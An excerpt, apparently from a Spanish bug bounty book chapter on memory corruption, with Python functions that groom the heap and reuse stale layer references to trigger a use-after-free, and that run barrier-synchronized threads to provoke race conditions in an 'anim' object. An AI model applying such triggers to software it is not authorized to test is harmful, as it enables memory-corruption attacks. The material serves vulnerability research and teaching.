# Extraído de: LibroBugBounty/cap-10-memory-corruption.md
def generate_uaf_sequence(anim):
    """Genera secuencia específica para triggear UAF."""
    layers = []
    # Fase 1: crear múltiples layers (llenar el heap)
    for _ in range(10):
        layer = anim.CreateLayer()
        anim.AddLayer(layer)
        layers.append(layer)

    # Fase 2: eliminar layers impares (crear huecos en el heap)
    removed = []
    for i in range(1, len(layers), 2):
        anim.RemoveLayer(layers[i])
        removed.append(layers[i])

    # Fase 3: crear nuevos layers (que ocupan los huecos)
    new_layers = []
    for _ in range(5):
        new_layer = anim.CreateLayer()
        anim.AddLayer(new_layer)
        new_layers.append(new_layer)

    # Fase 4: usar las referencias stale (removed[])
    # Estas pueden apuntar a los nuevos layers
    for stale in removed:
        try:
            anim.RemoveLayer(stale)  # UAF: opera sobre memoria reasignada
        except Exception as e:
            print(f"[UAF] {type(e).__name__}: {e}")

def generate_race_sequence(anim, num_threads=4, ops_per_thread=500):
    """Genera secuencia de race condition con threads concurrentes."""
    import threading
    errors = []
    barrier = threading.Barrier(num_threads)

    def worker(thread_id):
        barrier.wait()  # Todos empiezan simultáneamente
        for i in range(ops_per_thread):
            try:
                if i % 3 == 0:
                    layer = anim.CreateLayer()
                    anim.AddLayer(layer)
                elif i % 3 == 1:
                    anim.InsertLayerAt(i % 10, anim.CreateLayer())
                else:
                    anim.ClearLayers()
            except Exception as e:
                errors.append((thread_id, i, str(e)))

    threads = [threading.Thread(target=worker, args=(t,))
               for t in range(num_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return errors
